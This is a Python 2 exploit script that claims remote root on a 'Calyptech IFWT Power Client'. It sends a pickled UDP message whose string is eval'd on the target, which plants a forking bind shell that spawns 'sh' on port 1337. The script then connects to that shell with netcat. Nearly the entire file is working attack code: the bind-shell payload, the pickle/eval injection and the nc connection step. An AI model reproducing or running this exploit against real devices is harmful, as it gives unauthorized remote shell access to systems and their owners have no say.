#!/usr/bin/env python

import socket, os, pickle, getopt, subprocess, sys

if __name__ == '__main__':
    try:
        print """
      ./pwrtropic.py Calyptech IFWT Power Client Remote Root
      Vulnerability Discovered and Exploited by Tim Noise <darknoise@drkns.net>
      Not for distribution. 30-9-2013
        """

        listen_port = 0
        target_ip = ''
        target_port = 0

        options, remainder = getopt.getopt(sys.argv[1:], 'l:h:p:?', ['listen=',
                                                                   'host=',
                                                                   'port=',
                                                                   'help'
                                                                  ])
        for opt, arg in options:
            if opt in ('-?', '--help'):
                print """
options:
    --host|-h      : target host [default: 192.168.6.2, usb management host IP]
    --port|-p      : target port for power management [default: 65022]
    --listen|-l    : port for bindshell to listen on [default: 1337]
usage: %s
usage: %s --host 192.168.6.2 --listen 1337 --port 65022
usage: %s -h 192.168.6.2 -l 1337 -p 65022 

                """ % (sys.argv[0], sys.argv[0], sys.argv[0])
                sys.exit()

            elif opt in ('-l', '--listen'):
                listen_port = int(arg)
            elif opt in ('-h', '--host'):
                target_ip = arg
            elif opt in ('-p', '--port'):
                target_port = int(arg)

        if listen_port == 0:
            listen_port = 1337
        if target_ip == '':
            target_ip = '192.168.6.2'
        if target_port == 0:
            target_port = 65022


        """
        bind shell courtesy awarenetwork
        """
        bindshell = """
import md5,os,sys,select
from pty import spawn,fork
from socket import *
watch=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
port=""" + str(listen_port) + """
die=False
if os.fork(): sys.exit(0)
try:
    watch.bind(('0.0.0.0',port))
    watch.listen(5)
except:
    sys.exit(0)
while True:
    sock,remote=watch.accept()
    if os.fork(): continue
    pid,childID=fork()
    if pid==0:
        spawn('sh')
    else:
        b=sock.makefile(os.O_RDONLY|os.O_NONBLOCK)
        c=os.fdopen(childID,'r+');data='';
        x={b:c,c:b}
        while True:
            for f in select.select([b,c],[],[])[0]:
                try: d=os.read(f.fileno(),4096)
                except: sys.exit(0)
                if f is c and d.strip()==data:
                    data='';continue
                x[f].write(d)
                x[f].flush()
                data=d.strip()
    sock.close()"""

        print "[+] Preparing payload"

        payload = 'PING==eval(compile("""'+bindshell+'""","<string>","exec"))'
        message = pickle.dumps((payload,''))

        print "[+] Sending message with length: %d bytes" % len(message)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        sock.sendto(message, (target_ip, target_port))

        print "[+] Waiting for ACK"

        try:
            data, addr = sock.recvfrom(4096)
            data = pickle.loads(data)
        except:
            print "[!] No response! check host is up!"
            sys.exit()

        if data[0] == 'NAK':
            for k in data[1]:
                print "[i] %s: %s" % (k, data[1][k])
            print "[+] trying to connect to %s:%d, ^C to exit" % (target_ip, listen_port)
            subprocess.call(['nc', '-v', target_ip, str(listen_port)])
        else:
            print "[!] Unexpected ACK!"
    except KeyboardInterrupt:
        print "\n[x] bye!"
        sys.exit()
